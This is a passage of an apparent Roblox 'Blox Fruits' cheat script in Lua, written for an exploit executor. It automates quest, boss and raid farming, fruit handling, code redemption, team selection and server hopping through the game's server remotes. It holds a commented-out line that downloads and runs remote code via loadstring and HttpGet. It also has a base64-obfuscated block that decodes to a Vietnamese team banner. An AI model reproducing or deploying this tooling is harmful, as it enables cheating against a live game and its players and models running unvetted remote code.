                        if v.Name == "Bizarre Rifle" then
                            BizarreRifle:SetText("[+] : Bizarre Rifle")
                        end
                        if v.Name == "Shisui" then
                            Shisui:SetText("[+] : Shisui")
                        end
                        if v.Name == "Saddi" then
                            Saddi:SetText("[+] : Saddi")
                        end
                        if v.Name == "Wando" then
                            Wando:SetText("[+] : Wando")
                        end
                        if v.Name == "True Triple Katana" then
                            TrueTripleKatana:SetText("[+] : True Triple Katana")
                        end
                    end
                end
            
      --   end
--     
-- )
-- 
end)
end
         fruitMap = {}
fruitprice = {}
         for i, name in ipairs(fruit) do
            local parts = {}
            for part in string.gmatch(name, "[^-]+") do
               table.insert(parts, part)
            end
            local key = table.concat(parts, "-")
            local value = parts[1] .. " Fruit"
            fruitMap[key] = value
           --print(key, value )
         end
fruitMap[#fruitMap+1]="Human-Human: Buddha"
fruitMap[#fruitMap+1]="Bird-Bird: Phonex"
         -- Example usage:
         --print(fruitMap["Bomb-Bomb"]) -- Outputs: "Bomb Fruit"
         fruitprice = {}
         for r, v in next, game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(

         "GetFruits"


         ) do
            fruitprice[v.Name] = v.Price
       
         end


         function CheckMaterialCount(bj)

            for k, v in pairs(inv) do
               if v["Name"] == bj then
                  return v["Count"]
               end
            end
            return 0
         end
         function luoiquanenskidxdxdxd() 
           

                        SkypieaPlayers = {}

                        for r, v in pairs(game.Players:GetChildren()) do
                            pcall(
                                function()
                                    if
                                        v.Name ~= game.Players.LocalPlayer.Name and
                                            game.Workspace.Characters:FindFirstChild(v.Name) and
                                            v:FindFirstChild("Data") and
                                            v.Data:FindFirstChild("Race") and
                                            v.Data.Race.Value == "Skypiea" and
                                            v.Character:FindFirstChild("Humanoid")
                                     then
                                        table.insert(SkypieaPlayers, v)
                                    end
                                end
                            )
                        end 
                        return SkypieaPlayers 
         end 
                      
         function get1mfruit()
            for i, v in pairs(inv) do 
              
               if v.Type == 'Blox Fruit' and (v.Rarity == 3 or string.find(v.Name, "Gravi")) then
                 print("Get Fruit: "..v.Name)
                  return v.Name
               end
            end
            return false
         end
         function getRaidFruit ()
           
               for suc, cat in pairs(inv) do
                  print (cat.Type)
                  if cat.Name and cat.Type == "Blox Fruit" and cat.Rarity and (cat.Rarity == 0 or cat.Rarity == 1) then
                 
                   print(cat.Name)
                     raidfruit = cat.Name
               
                     return cat.Name
                  end
               end
         end

         function loadfruit(seg)
            
            if not seg then return end
   
          return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", seg)
         end

         spawn(
         function()
            if not c().Misc["Remove Terrain"] then return end
 local decalsyeeted = true
           local g = game
           local w = g.Workspace
           local l = g.Lighting
           local t = w.Terrain
           t.WaterWaveSize = 0
           t.WaterWaveSpeed = 0
           t.WaterReflectance = 0
           t.WaterTransparency = 0
           l.GlobalShadows = false
           l.FogEnd = 9e9
           l.Brightness = 0
           settings().Rendering.QualityLevel = "Level01"
           All = #g:GetDescendants()
           gay = 0
           for i, v in pairs(g:GetDescendants()) do
     
       
               if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then 
                   v.Material = "Plastic"
                   v.Reflectance = 0
               elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                   v.Transparency = 1
               elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                   v.Lifetime = NumberRange.new(0)
               elseif v:IsA("Explosion") then
                   v.BlastPressure = 1
                   v.BlastRadius = 1
               elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                   v.Enabled = false
               elseif v:IsA("MeshPart") then
                   v.Material = "Plastic"
                   v.Reflectance = 0
                   v.TextureID = 10385902758728957
               end
           end
           for i, e in pairs(l:GetChildren()) do
               if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                   e.Enabled = false
               end
           end
          --  game.ReplicatedStorage.Effect.Container.Death:Destroy()
  --          game.ReplicatedStorage.Effect.Container.Respawn:Destroy()
            game.ReplicatedStorage.Effect.Container.Hit:Destroy()
         end
         ) 
         while wait() and game.Players.LocalPlayer.Team == nil do
            if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("ChooseTeam") then
               repeat
                  wait()
                  if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then

                     for i, v in pairs(
                     getconnections(
                     game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated
                     )
                     ) do
                        v.Function()

                     end
                  end
               until game.Players.LocalPlayer.Team ~= nil
            end
         end


         --<---------- func ---------->--







         local bM = {}

         local HttpService = game:GetService("HttpService")
         local bN = "!Blacklist_Servers.json"
         function SaveSettings2()
            local HttpService = game:GetService("HttpService")
            if not isfolder(".teus/utils/") then
               makefolder(".teus/utils/")
            end
            writefile(".teus/utils/" .. bN, HttpService:JSONEncode(bM))
         end
         function ReadSetting2()
            local s, o =
            pcall(
            function()
               local HttpService = game:GetService("HttpService")
               Hub = game:GetService("HttpService")
               if not isfolder(".teus/utils/") then
                  makefolder(".teus/utils/")
               end
               return HttpService:JSONDecode(readfile(".teus/utils/" .. bN))
            end
            )
            if s then
               return o
            else
               SaveSettings2()
               return ReadSetting2()
            end
         end
         bM = ReadSetting2()

         function HopServer(bO)
            if not bO then
               bO = 10
            end
            ticklon = tick()
            repeat
               task.wait()
            until tick() - ticklon >= 2
            local function Hop()
               noti("Server Hop", 5)
               for r = 1, 100 do
                  if ChooseRegion == nil or ChooseRegion == "" then
                     ChooseRegion = "Singapore"
                  else
                     game:GetService("Players").LocalPlayer.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text =
                     ChooseRegion
                  end
                  local bP = game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(r)
                  for k, v in pairs(bP) do
                     if k ~= game.JobId and v["Count"] < bO then
                        if not bM[k] or tick() - bM[k].Time > 60 * 10 then
                           bM[k] = {Time = tick()}
                           SaveSettings2()
                           if game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible then
                              noti("Wait For End InCombat", 15)
                              repeat
                                 wait()

                              until not game:GetService("Players").LocalPlayer or
                              not game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible
                              
                           else
                             
                           end
                           game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", k)
                           return true
                        elseif  tick() - bM[k].Time > 60 * 60 then
                           bM[k] = nil
                        end
                     end
                  end
               end
               return false
            end
            if not getgenv().Loaded then
               local function bQ(v)
                  if v.Name == "ErrorPrompt" then
                     if v.Visible then
                        if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                           HopServer()
                           v.Visible = false
                        end
                     end
                     v:GetPropertyChangedSignal("Visible"):Connect(
                     function()
                        if v.Visible then
                           if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                              HopServer()
                              v.Visible = false
                           end
                        end
                     end
                     )
                  end
               end
               for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
                  bQ(v)
               end
               game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(bQ)
               getgenv().Loaded = true
            end
            while not Hop() do
               wait()
            end
            SaveSettings2()
         end
         function getPlayerLevel()
            return lp.Data.Level.Value
         end

         function getPlayerBeli()
            return lp.Data.Beli.Value
         end

         function getPlayerFragments()
            return lp.Data.Fragments.Value
         end

         function getPlayerHealth()
            return math.floor(char.Humanoid.Heath)
         end


         function IsIslandRaid(cu)
            if game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island " .. cu) then
               min = 4500
               for r, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                  if
                  v.Name == "Island " .. cu and
                  (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < min
                  then
                     min = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                  end
               end
               for r, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                  if
                  v.Name == "Island " .. cu and
                  (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= min
                  then
                     return v
                  end
               end
            end
         end

         function getNextIsland()
            TableIslandsRaid = {5, 4, 3, 2, 1}
            for r, v in pairs(TableIslandsRaid) do
               if
               IsIslandRaid(v) and
               (IsIslandRaid(v).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
               4500
               then
                  return IsIslandRaid(v)
               end
            end
         end

         function checkIsHaveAllSkillsFruit() 
           if not game.Players.LocalPlayer.Data.DevilFruit.Value then return end
           if not game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value) then 
             repeat wait() 
               equip"Blox Fruit" 
             until game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value) 
           end 
            if (game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value):FindFirstChild"V" and game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).V.Title.TextColor3 == Color3.fromRGB(114, 114, 114)) or (game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value):FindFirstChild"C" and game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).C.Title.TextColor3 == Color3.fromRGB(114, 114, 114)) then 
              return false 
            end 
            return true
            end
         function CheckIsRaiding()
            checkraid1 = game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible
            checkraid2 = getNextIsland()
            if checkraid1 then
               return checkraid1
            end
            return checkraid2
         end






         function CheckDoubleQuest()

            local a = {}
            for r, v in pairs(Q) do
               for M, N in pairs(v) do
                  local U = N.LevelReq
                  for O, P in pairs(N.Task) do
                     if O == Mob1 then
                        for _, a0 in next, v do
                           if a0.LevelReq <= game.Players.LocalPlayer.Data.Level.Value and a0.Name ~= "Town Raid" then
                              for a1, a2 in next, a0.Task do
                                 if a2 > 1 then
                                    table.insert(a, a1)
                                 end
                              end
                           end
                        end
                     end
                  end
               end
            end
            return a 
         end
         local a3 = require(game.ReplicatedStorage:WaitForChild("GuideModule"))
         function CheckQuestData()
            for r, v in next, a3.Data do
               if r == "QuestData" then
                  return true
               end
            end
            return false
         end

         function CheckNameDoubleQuest()
            local a
            if CheckQuestData() then
               for r, v in next, a3.Data.QuestData.Task do
                  a = r
               end
            end
            return a
         end
         function CheckNameDoubleQuest2()
            local a
            local a4 = {}
            if CheckQuestData() then
               for r, v in next, a3.Data.QuestData.Task do
                  a = r
                  table.insert(a4, r)
               end
            end
            return a4
         end

         function CheckDoubleQuest2()
            checkq()
            local a5 = {}
            if
            game.Players.LocalPlayer.Data.Level.Value >= 10 and CheckQuestData() and
            CheckNameDoubleQuest() == Mob1 and
            #CheckNameDoubleQuest() > 2
            then
               for r, v in pairs(Q) do
                  for M, N in pairs(v) do
                     for O, P in pairs(N.Task) do
                        if tostring(O) == Mob1 then
                           for a6, a7 in next, v do
                              for a8, a9 in next, a7.Task do
                                 if a8 ~= Mob1 and a9 > 1 then
                                    if a7.LevelReq <= game.Players.LocalPlayer.Data.Level.Value then
                                       a5["Name"] = tostring(a8)
                                       a5["NameQuest"] = r
                                       a5["ID"] = a6
                                    else
                                       a5["Name"] = Mob1
                                       a5["NameQuest"] = Mob2
                                       a5["ID"] = Mob3
                                    end
                                    return a5
                                 end
                              end
                           end
                        end
                     end
                  end
               end
            else
               a5["Name"] = Mob1
               a5["NameQuest"] = Mob2
               a5["ID"] = Mob3
               return a5
            end
            a5["Name"] = Mob1
            a5["NameQuest"] = Mob2
            a5["ID"] = Mob3
            return a5
         end
         
function moctui(r)

  local aA, aB = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1"), game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
  if game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") and r == 4 then 
    return true
  end
  if aA == -2 and r == 3 then
    return true
  end 
  if aB == -2 and r == 2 then 
    return true
  end
  if r == 1 then 
  return true
  end 
  return false
end 
pcall(function ()
--loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)
function getsortedmon()
    local beo = game.Players.LocalPlayer
    local memay = beo.Character:WaitForChild"HumanoidRootPart"
    local chim = workspace.Enemies: GetChildren ()
    local bamaysuccac = {} 
    for i, v in pairs(chim) do 
      if v.Name ~= "PirateBasic" and v.Name ~= "PirateBrigade" and v:FindFirstChild"HumanoidRootPart" then 
        table.insert(bamaysuccac, v) 
       end
      end
    table.sort(bamaysuccac, function(aL, aM)
      
        return beo: DistanceFromCharacter(aL.HumanoidRootPart.Position) < beo: DistanceFromCharacter (aM.HumanoidRootPart.Position) 
    end)
   
   return bamaysuccac

-- return bamaysuccac or game.Workspace.Enemies:GetChildren()
end

function whatismyrace() 
  return game:GetService("Players").LocalPlayer.Data.Race.Value 
end 

         function MobLevel1OrMobLevel2()
            local aa = {}
            for r, v in pairs(getsortedmon()) do
               if
               not table.find(aa, v.Name) and v:IsA("Model") and v.Name ~= "PirateBasic" and
               not string.find(v.Name, "Brigade") and
               v:FindFirstChild("Humanoid") and
               v.Humanoid.Health > 0 and
               v:FindFirstChild("HumanoidRootPart")
               then
                  table.insert(aa, v.Name)
               end
            end
            for r, v in pairs(aa) do
               local ab = v
               
               v = tostring(v:gsub(" %pLv. %d+%p", ""))
               if tostring(v) == CheckNameDoubleQuest() then
                  return tostring(ab)
               end
            end
            return false
         end
         local ad = game.ReplicatedStorage.Remotes["CommF_"]
         raidlist = {}
           for i, v in pairs(require(game:GetService("ReplicatedStorage").Raids).advancedRaids) do 
             table.insert(raidlist, v) 
           end 
           for i, v in pairs(require(game:GetService("ReplicatedStorage").Raids).raids) do 
             table.insert(raidlist, v) 
           end
           
function getraidchip() 
  local df = game.Players.LocalPlayer.Data.DevilFruit.Value 
  for i, v in pairs(raidlist) do  
   
    if string.find(df, v) then 
      return v 
    end 
  end 
  
  return "Dark"
end
         function GetQuest()
            if game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
               return
            end
            if not QuestPoint[tostring(CheckDoubleQuest2().NameQuest)] then
               CFrameQuest()
               return
            end
            if
            (QuestPoint[CheckDoubleQuest2().NameQuest].Position -
            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 8
            then 
              vc = CheckDoubleQuest2()
               ad:InvokeServer("StartQuest", tostring(vc.NameQuest), vc.ID)
               MobDual2 = vc.Name  
            

            else
               QuestCFrame = QuestPoint[CheckDoubleQuest2().NameQuest]
               to(QuestCFrame) 
               
            end
            
         
         end

         function checkNotify(msg)
           msg = string.lower(msg)
            for r, k in pairs(game.Players.LocalPlayer.PlayerGui.Notifications:GetDescendants()) do

               if k:IsA("TextLabel") then

                  if string.find(string.lower(k.Text), msg) then
                     return true
                  end
               end
            end
         end
        local radius = 30
local speed = 50
local angle = 0
y = 45
function getKillVector3(pos)
    angle = angle + speed
    return pos + Vector3.new(math.sin(math.rad(angle)) * radius, y, math.cos(math.rad(angle)) * radius)
end

         function autopoint()
            if getPlayerLevel() > 500 and CheckSea(1) then
               return "Defense"
            elseif getPlayerLevel() > 2100 then
               return "Sword"
            elseif getPlayerLevel() > 1800 then 
               return "Blox Fruit"
            else
               return "Melee"
            end
         end

         function GetAndCheckMeleeMastery(bu, bs)

            mm = bu
            usingmelee = browhat[NameMelee()]
            momo = browhat[mm]
            -- print(bu, mm, usingmelee , momo, browhat[mm])
            --  print(momo)
            if type(momo) == "string" then
               momo = (game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo, true) == 1)
            else
               momo = momo()
            end
            if momo then
               if
               not game.Players.LocalPlayer.Character:FindFirstChild(mm) and
               not game.Players.LocalPlayer.Backpack:FindFirstChild(mm)
               then
                  momo = browhat[mm]
                  if type(momo) == "string" then
                     game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo, true)
                     momo = game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo)
                  else
                     momo = momo()
                  end
               end
               if game.Players.LocalPlayer.Character:FindFirstChild(mm) or game.Players.LocalPlayer.Backpack:FindFirstChild(mm) then
                  kwekrwe = {game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Backpack}
                  for r, v in pairs(kwekrwe) do
                     if v:FindFirstChild(mm) then
                        return v[mm].Level.Value
                     end
                  end
               end
            end
            return 0
         end



function sh()

    local bf = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
    if bf == 0 then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "2") 
    end 
end
    
         function getMeleeMastery()
            local buoieltrul = NameMelee(true)
            
            if buoieltrul then
              
                
               if buoieltrul:FindFirstChild"Level" and meleetable3[buoieltrul.Name] then
               pcall(function ()  vclui[buoieltrul.Name] = "[+] : "..buoieltrul.Name end)
                  eltrul[buoieltrul.Name]= buoieltrul.Level. Value 
                 
               end
            end
         end


         -- print (type(NameMelee()))
         function getFruitTier(fr)

spawn(function()
           print (": "..fr.." tier: "..tostring(fruittier[fr] or fruittier[fruitMap[fr]] or 0))
end)
            return fruittier[fr] or fruittier[fruitMap[fr]]
         end







         function buyMelee(melee)
            if table.find(meleetable, melee) then
               pcall(function()
               game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", melee, "2")
               game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. melee) 
               end)
            end
         end



         function getMobLoadPos(a)
            for c, d in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
           if d.Name == a  then
                  -- warn("Load Mon: "..a.." Load Mob Get: "..d.Name)
                  
     
                     return d.CFrame
                

           end 
            end
            for c, d in pairs(getnilinstances()) do
           if d.Name and string.find(d.Name,a) then
                  -- warn("Load Mon: "..a.." Load Mob Get: "..d.Name)
                  
        
                     return d.CFrame or d.HumanoidRootPart.CFrame
            

           end 
            end
             for i,v in pairs(game.Workspace.Enemies:GetChildren()) do 
               if skidymf(v) and v.Name and string.find(v.Name, a) then
                 return v.HumanoidRootPart.CFrame 
               end 
               end
             for i,v in pairs(game.ReplicatedStorage:GetChildren()) do 
               if skidymf(v) and v.Name and string.find(v.Name, a) then
                 return v.HumanoidRootPart.CFrame or v.CFrame
               end 
               end
            --
            --     for c, d in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
            --         if string.find(d.Name, a) or d.Name == a or string.find(d.Name, a)then
            --
            --             return d.HumanoidRootPart.CFrame
            --         end
            --     end

           
         end


         function checkq()
            local T = game.Players.LocalPlayer.Data.Level.Value
            local min = 0
            if T >= 1450 and game.PlaceId == 4442272183 then
               Mob1 = "Water Fighter"
               Mob2 = "ForgottenQuest"
               Mob3 = 2
            elseif  T >= 700 and game.PlaceId == 2753915549 then
               Mob1 = "Galley Captain"
               Mob2 = "FountainQuest"
               Mob3 = 2
            elseif  T >= 1350 and not checkitem("Rengoku") and c().Process["Force Rengoku"] then
               set1("Forcing Monster On Ice Castle For Rengoku")
               local shitbozo = math.random(1,2)
               Mob2 = "FrostQuest"
               if shitbozo == 1 then
                  Mob1 = "Snow Lurker"
                  Mob3 = 2
               else
                  Mob1 = "Arctic Warrior"
                  Mob3 = 1
               end
            elseif T >= 2050 and checkm2("DragonTalon") ~= 1 and not checkMelee("DragonTalon") and eltrul["Electric Claw"] > 399 then
                  Mob1 = "Posessed Mummy"
                  Mob2 = "HauntedQuest2"
                  Mob3 = 2
               else
                  for r, v in pairs(Q) do
                     for M, N in pairs(v) do
                        local U = N.LevelReq
                        for O, P in pairs(N.Task) do
                           if T >= U and U >= min and N.Task[O] > 1 and not table.find(R, tostring(r)) then
                              min = U
                              Mob1 = tostring(O)
                              Mob2 = r
                              Mob3 = M
                           end
                        end
                     end
                  end
               end
            end
            function spamandwait(wt) 
              taocanpasue = true 
              for i, v in pairs(wt) do 
                down(v) 
                repeat wait(.1) until not game.Players.LocalPlayer.Character.Busy.Value 
              end 
              taocanpasue = false
            end 
            
            function stuff(monmonmon)
              Buso()
                if monmonmon and getPlayerLevel() > 2499 and c().Process["Farm Fruit Mastery After Done Cdk Quest"] and checkitem"Cursed Dual Katana" and skidymf(monmonmon) and (monmonmon.Humanoid.Health/monmonmon.Humanoid.MaxHealth)*100 < 65 and not checkIsHaveAllSkillsFruit() then 
                    dmlockskill = monmon.HumanoidRootPart.Position
                    
                    equip("Blox Fruit")
                    spamandwait({"Z", "X", "C", "V", "F"}) 
                    end 
                 dmlockskill = false
               equip(forcewp or "Melee")
            end
            
            local function a(b)local c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'local d={}for e=1,#c do d[c:sub(e,e)]=e-1 end;local f=string.sub(b,-2)=='=='and 2 or string.sub(b,-1)=='='and 1 or 0;local g={}for e=1,#b-f,4 do local h,i,j,k=string.byte(b,e,e+3)local l=d[string.char(h)]*262144+d[string.char(i)]*4096+d[string.char(j)]*64+d[string.char(k)]table.insert(g,string.char(l/65536))table.insert(g,string.char(l/256%256))table.insert(g,string.char(l%256))end;for e=1,f do table.remove(g)end;return table.concat(g)end;local m="Q2jDoG8gTeG7q25nIELhuqFuIMSQw6MgxJDhur9uDQogICAgICAgICAgICAgICAvJCQkJCQkJCAgICAgICAgICAgICAgICAgICAgICAvJCQgICAgICAgICAgICAgICAgIC8kJCQkJCQkJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgfCAkJF9fICAkJCAgICAgICAgICAgICAgICAgICAgfF9fLyAgICAgICAgICAgICAgICB8X18gICQkX18vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICB8ICQkICBcICQkICAvJCQkJCQkICAgLyQkJCQkJCQgLyQkICAvJCQkJCQkICAgICAgICAgIHwgJCQgIC8kJCQkJCQgICAvJCQkJCQkICAvJCQkJCQkLyQkJCQgDQogICAgICAgICAgICAgIHwgJCQkJCQkJC8gLyQkX18gICQkIC8kJF9fX19fL3wgJCQgLyQkX18gICQkICAgICAgICAgfCAkJCAvJCRfXyAgJCQgfF9fX18gICQkfCAkJF8gICQkXyAgJCQNCiAgICAgICAgICAgICAgfCAkJF9fICAkJHwgJCQgIFwgJCR8ICAkJCQkJCQgfCAkJHwgJCQkJCQkJCQgICAgICAgICB8ICQkfCAkJCQkJCQkJCAgLyQkJCQkJCR8ICQkIFwgJCQgXCAkJA0KICAgICAgICAgICAgICB8ICQkICBcICQkfCAkJCAgfCAkJCBcX19fXyAgJCR8ICQkfCAkJF9fX19fLyAgICAgICAgIHwgJCR8ICQkX19fX18vIC8kJF9fICAkJHwgJCQgfCAkJCB8ICQkDQogICAgICAgICAgICAgIHwgJCQgIHwgJCR8ICAkJCQkJCQvIC8kJCQkJCQkL3wgJCR8ICAkJCQkJCQkICAgICAgICAgfCAkJHwgICQkJCQkJCR8ICAkJCQkJCQkfCAkJCB8ICQkIHwgJCQNCiAgICAgICAgICAgICAgfF9fLyAgfF9fLyBcX19fX19fLyB8X19fX19fXy8gfF9fLyBcX19fX19fXy8gICAgICAgICB8X18vIFxfX19fX19fLyBcX19fX19fXy98X18vIHxfXy8gfF9fLyAgICAgICAgICAgICAgICANCiAgICAgIFsrXSBSb3NpZSBUZWFtIEPhuqNtIMagbiBC4bqhbiDEkMOjIFRpbiBUxrDhu59uZyBWw6AgU+G7rSBE4bulbmcgROG7i2NoIFbhu6UgQ+G7p2EgQ2jDum5nIFTDtGksIE7hur91IFRo4bqleSBI4buvdSDDjXQgSMOjeSBDaGlhIFPhursgQ2hvIELhuqFuIELDqCBD4bunYSBC4bqhbiAhIQ0KICAgICAgWytdIEtow7RuZyDEkMaw4bujYyBTaGFyZSBIYXkgQ3JhY2sgTcOjIE5ndeG7k24gTsOgeSBDaG8gQWkhIE7hur91IEtow7RuZyBC4bqhbiBT4bq9IELhu4sgQmFuIElQIEto4buPaSBXZWJzaXRlIFbEqW5oIFZp4buFbiENCiAgICAgIFsrXSBDaMO6bmcgVMO0aSBLaMO0bmcgTmjhuq1uIEjhu5cgVHLhu6MgTmjhu69uZyBNw6MgTmd14buTbiBNaeG7hW4gUGjDrSwgWGluIMSQ4burbmcgQuG6o28gVsOsIFNhby4gVOG6oW8gVGlja2V0IEjhu5cgVHLhu6MgQ+G7p2EgV2Vic2l0ZSBU4bqhaTogaHR0cHM6Ly9yb3NpZXRlYW0ubmV0L2Rhc2gvdGlja2V0DQogICAgICBbK10gIE7hur91IELhuqFuIEVkaXQgU291cmNlIFbDoCBVcCBXZWIgU2hhcmUgTmjhu5sgT2JmdXNjYXRlIFNjcmlwdC4gTuG6v3UgQuG6oW4gQ8OzIFRp4buBbiBUaMOsIFPhu60gROG7pW5nOiBMdXJhLlBoLCBMdWFybW9yLk5ldCB8IE7hur91IELhuqFuIEtow7RuZyBDw7MgVGnhu4FuIFRow6wgRMO5bmc6IGx1YW9iZnVzY2F0ZS5jb20sIE1vb25TZWMsIDc3RnVzY2F0ZSwuLi4gTmjDqSENCl1d"local n=a(m)warn(n)

            function Buso()
               if (not (game.Players.LocalPlayer.Character:FindFirstChild("HasBuso"))) then
                  local rel = game.ReplicatedStorage

                  rel.Remotes.CommF_:InvokeServer("Buso")
               end
            end

            function getmon(mk) 
              return game.Workspace.Enemies: FindFirstChild(mk)
              
            end
         function throughcheck(data, key, data2) 
           for i, v in pairs(data) do 
             print(i, v)
             lmao = i 
             if key == 1 then
               lmao = V 
             end
             print(lmao)
             if data2(lmao) then 
              
               return data2(lmao)
             end
           end
             return false 
         end 
         function RedeemAllCodesX2()

            CodesX2 = {
               "Sub2CaptainMaui",
               "CODE_SERVICIO",
               "CINCODEMAYO_BOOST",
               "15B_BESTBROTHERS",
               "DEVSCOOKING",
               "GAMERROBOT_YT",
               "ADMINGIVEAWAY",
               "GAMER_ROBOT_1M",
               "TY_FOR_WATCHING",
               "kittgaming",
               "Sub2Fer999",
               "Enyu_is_Pro",
               "Magicbus",
               "JCWK",
               "Starcodeheo",
               "Bluxxy",
               "fudd10_v2",
               "FUDD10",
               "BIGNEWS",
               "THEGREATACE",
               "SUB2GAMERROBOT_EXP1",
               "Sub2OfficialNoobie",
               "StrawHatMaine",
               "SUB2NOOBMASTER123",
               "Sub2Daigrock",
               "Axiore",
               "TantaiGaming"
            }
            for r, v in pairs(CodesX2) do
               game:GetService("ReplicatedStorage").Remotes.Redeem:InvokeServer(v)
            end
         end

         function CheckQuestBoss(bg)

            local c5 = bg

            local a
            local ab
            if string.find(c5, " %pRaid Boss%p") then
               a = string.gsub(c5, "%pLv. %d+%p", "")
               ab = string.gsub(a, "  %pRaid Boss%p", "")
            else
               a = string.gsub(c5, "%pLv. %d+%p", "")
               ab = string.gsub(a, "  %pBoss%p", "")
            end
            for r, v in next, require(game:GetService("ReplicatedStorage").Quests) do
               for M, N in next, v do
                  for O, P in next, N.Task do
                     if O == ab then
                        return ab
                     end
                  end
               end
            end
         end

         function GetInfoBossQuest(cy)
            returnrnrnr = {}
            for r, v in next, require(game:GetService("ReplicatedStorage").Quests) do
               for M, N in next, v do
                  if N.LevelReq <= getPlayerLevel() and N.Name == cy then
                     returnrnrnr["QuestName"] = r
                     returnrnrnr["QuestId"] = M
                     return returnrnrnr
                  end
               end
            end
         end

         function getBossCanKill()
            for i , v in pairs(c().Process.Boss["Questable Boss"]) do
               local a = CheckBoss(v)

               if a then
                  levelstring = string.gsub(string.gsub(a.Name, ".*Lv%.%s*(%d+).*", "%1"), " ", "")
              

                  levelnum = tonumber(levelstring)
                  
                  return {
                     a,
                     GetInfoBossQuest(CheckQuestBoss(a.Name)),
                     levelstring,
                     (getPlayerLevel() >= levelnum),
                  }
               end
            end 
            return {[4] = false}
         end



         function CheckWaterKey()


            local bv = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
            if bv == 3 or bv == 1 then
               WaterKey = true
               return true
            end
            return false
         end
         function getSpeficalBoss()
            return CheckBoss("Darkbeard [Lv. 1000] [Raid Boss]") or CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]")
         end
         
         lp = game.Players.LocalPlayer

local specialitems = {"Special Microchip", "God's Chalice", "Sweet Chalice", "Relic", "Key", "Torch", "Flower 1", "Flower 2", "Flower 3", "Hallow Essence", "Fire Essence", "Holy Torch", "Library Key", "Hidden Key", "Water Key"}
rarity = {
  [0] = "🟤",
  [1] = "🔵",
  [2] = "🟢",
  [3] = "🟡",
  [4] = "🔴",
  [5] = "wtf"
}
function resetable() 
  for i, v in pairs(specialitems) do
  local a1, a2 = game:GetService("Players").LocalPlayer.Backpack: FindFirstChild(v), game:GetService("Players").LocalPlayer.Character: FindFirstChild(v)
    if a1 or a2 then 
      return false 
    end 
  end 
  for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do 
    if v:FindFirstChild"EatRemote" then return false end 
    end
  for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
    if v:FindFirstChild"EatRemote" then return false end 
    end
  return true 
end 

 
function getSpawn(wtf)
   local a, b = nil, math.huge
   for i,v in pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(lp.Team)):GetChildren()) do
